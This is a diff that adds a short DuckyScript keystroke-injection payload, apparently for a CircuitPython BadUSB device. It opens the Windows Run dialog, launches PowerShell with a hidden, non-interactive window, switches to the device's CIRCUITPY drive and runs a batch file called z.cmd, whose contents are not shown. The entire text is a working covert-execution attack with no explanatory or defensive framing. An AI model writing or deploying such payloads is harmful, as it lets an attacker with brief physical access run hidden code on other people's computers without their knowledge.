@@ -1,0 +1,11 @@
+DELAY 1000
+Gui r
+DELAY 500
+STRING powershell -NoP -NonI -W hidden
+ENTER
+DELAY 500
+STRING cd ((Get-Volume -FriendlyName "CIRCUITPY").DriveLetter + ":")
+ENTER
+DELAY 500
+STRING .\z.cmd
+ENTER 
